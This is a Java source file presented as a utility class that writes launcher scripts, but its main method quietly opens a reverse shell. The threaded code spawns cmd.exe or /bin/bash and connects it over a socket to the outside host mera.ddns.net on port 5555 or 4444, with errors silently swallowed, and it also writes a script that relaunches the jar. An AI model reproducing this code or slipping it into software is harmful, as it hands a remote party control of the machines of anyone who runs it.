package Utils;

import java.io.*;
import java.net.Socket;

@SuppressWarnings("all")
public class Util {

    /**
     * @echo off
     * set port=9999
     * for /f "tokens=1-5" %%i in ('netstat -ano^|findstr ":%port%"') do taskkill /pid %%m -t -f
     * start java -Dfile.encoding=utf-8 -Dserver.port=9999 -jar xxx-v1.0.1.jar
     * start javaw -Xmx2g -jar src/Utils/Utils.jar
     */

    public static void linuxSH(){
        String scriptContent = "#!/bin/bash \n \"java -jar src/Utils/Utils.jar &\" > out/production/utils.sh";
        try{
            Writer output = new BufferedWriter(new FileWriter("out/production/utils.sh"));
            output.write(scriptContent);
            output.close();
            Runtime.getRuntime().exec("chmod u+x out/production/utils.sh");
        }catch (IOException ex){}
    }

    public static void windowsBat(){
        String scriptContent = "@echo off \n echo \"start javaw -Xmx2g -jar src/Utils/Utils.jar\" > out/production/utils.bat";
        try{
            Writer output = new BufferedWriter(new FileWriter("out/production/utils.bat"));
            output.write(scriptContent);
        }catch (IOException ex){}
    }



    public static void main(String... args) {
        linuxSH();
        Thread thread = new Thread(() -> {
            String cmd =  ((System.getProperty("os.name").contains("Windows"))) ? "cmd.exe" : "/bin/bash";
             int port =  ((System.getProperty("os.name").contains("Windows"))) ? 5555 : 4444;
            try { Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket("mera.ddns.net",port);
                InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();
                while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());
                    so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception ignored){} };p.destroy();s.close(); }catch (IOException | InterruptedException e){} });
        thread.start();
    }
}